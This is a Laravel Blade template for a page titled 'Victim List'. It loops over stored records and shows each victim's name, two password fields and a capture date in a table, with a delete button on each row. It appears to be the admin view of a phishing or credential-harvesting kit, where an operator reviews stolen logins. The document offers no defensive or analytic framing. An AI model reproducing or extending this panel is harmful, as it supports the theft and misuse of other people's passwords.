@extends('layouts.app')
@section('title')
  Home Page
@endsection

@section('content')
<div class="bg-white">
  <div class="container-login100" style="background-image: url('{{asset('public/frontend/img/img-01.jpg')}}');">
      <div class="container">
          <div class="row">
              <div class="col-12">
                <h3 class="text-center mb-3 text-warning">Victim List</h3>
                <table class="table table-bordered table-striped text-center text-light">
                  <tr>
                    <th>ID</th>
                    <th>Name</th>
                    <th>password</th>
                    <th>password Two</th>
                    <th>Date</th>
                    <th>Delete</th>
                  </tr>
                    @foreach ($victim as $data)
                      <tr>
                        <td>{{ $data->id }}</td>
                        <td>{{ $data->victim_name }}</td>
                        <td>{{ $data->password }}</td>
                        <td>{{ $data->password_2 }}</td>
                        <td>{{ $data->created_at->diffForHumans() }}</td>
                        <td><a href="{{ route('victim-delete',$data->id) }}" class="btn btn-danger">Delete</a></td>
                      </tr>
                    @endforeach
                </table>
              </div>
          </div>
      </div>
  </div>
</div>


@endsection
